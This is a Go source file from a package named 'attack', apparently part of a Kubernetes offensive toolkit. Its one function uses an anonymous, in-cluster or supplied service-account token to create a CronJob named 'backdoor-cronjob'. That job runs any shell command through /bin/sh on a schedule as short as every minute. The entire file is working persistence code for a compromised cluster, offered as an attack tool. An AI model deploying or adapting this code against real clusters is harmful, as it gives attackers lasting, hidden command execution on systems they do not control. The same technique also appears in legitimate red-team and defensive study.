package attack

import (
	"context"

	"github.com/KPT/gadget/errors"
	log "github.com/sirupsen/logrus"
	batchv1 "k8s.io/api/batch/v1"
	"k8s.io/api/batch/v1beta1"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

// func CreateCron(namespace, image, cron, command string) {
func K8sCronJobDeploy(token, namespace, cron, image, cmd string) {
	var config = new(rest.Config)
	var err = errors.New("")
	switch token {
	case "anonymous":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
		config = rest.AnonymousClientConfig(config)
	case "default":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
	default:
		config, err = SelfSAConfig(token)
		if err != nil {
			log.Fatal(err)
		}
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	var croncode string
	switch cron {
	case "min":
		croncode = "* * * * *"
	case "hour":
		croncode = "0 * * * *"
	case "day":
		croncode = "0 0 * * *"
	default:
		croncode = cron
	}
	cronjob, err := clientset.BatchV1beta1().CronJobs(namespace).Create(context.TODO(), &v1beta1.CronJob{
		ObjectMeta: metav1.ObjectMeta{
			Name: "backdoor-cronjob",
		},
		Spec: v1beta1.CronJobSpec{
			Schedule: croncode,
			JobTemplate: v1beta1.JobTemplateSpec{
				Spec: batchv1.JobSpec{
					Template: v1.PodTemplateSpec{
						ObjectMeta: metav1.ObjectMeta{},
						Spec: v1.PodSpec{
							RestartPolicy: v1.RestartPolicyNever,
							Containers: []v1.Container{
								{
									Name:            "backdoor-cronjob",
									Image:           image,
									Command:         []string{"/bin/sh"},
									Args:            []string{"-c", cmd},
									ImagePullPolicy: v1.PullIfNotPresent,
								},
							},
						},
					},
				},
			},
		},
	}, metav1.CreateOptions{})
	if err != nil {
		log.Fatal(err)
	}
	log.WithFields(log.Fields{"SUCCESS": true}).Infof("Successfully create CronJob %s !", cronjob.Name)
}
